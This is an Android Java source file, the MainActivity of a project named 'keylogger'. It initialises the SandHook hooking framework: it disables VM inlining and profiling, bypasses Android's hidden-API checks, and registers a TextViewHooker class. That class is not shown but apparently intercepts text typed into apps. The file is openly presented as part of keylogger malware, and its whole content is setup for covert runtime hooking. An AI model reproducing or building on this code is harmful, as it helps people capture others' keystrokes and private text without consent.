package com.arc.keylogger;

import android.os.Build;
import android.os.Bundle;

import androidx.appcompat.app.AppCompatActivity;

import com.arc.keylogger.Hooks.TextViewHooker;
import com.swift.sandhook.SandHook;
import com.swift.sandhook.SandHookConfig;
import com.swift.sandhook.wrapper.HookErrorException;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        init();
    }

    private void init() {
        if (Build.VERSION.SDK_INT == 29 && getPreviewSDKInt() > 0) {
            SandHookConfig.SDK_INT = 30;
        }

        SandHook.disableVMInline();
        SandHook.tryDisableProfile(getPackageName());
        SandHook.disableDex2oatInline(false);

        if (SandHookConfig.SDK_INT >= Build.VERSION_CODES.P) {
            SandHook.passApiCheck();
        }

        SandHookConfig.DEBUG = BuildConfig.DEBUG;
        try {
            SandHook.addHookClass(TextViewHooker.class);
        } catch (HookErrorException e) {
            e.printStackTrace();
        }
    }

    public static int getPreviewSDKInt() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                return Build.VERSION.PREVIEW_SDK_INT;
            } catch (Throwable e) {
                e.printStackTrace();
            }
        }
        return 0;
    }
}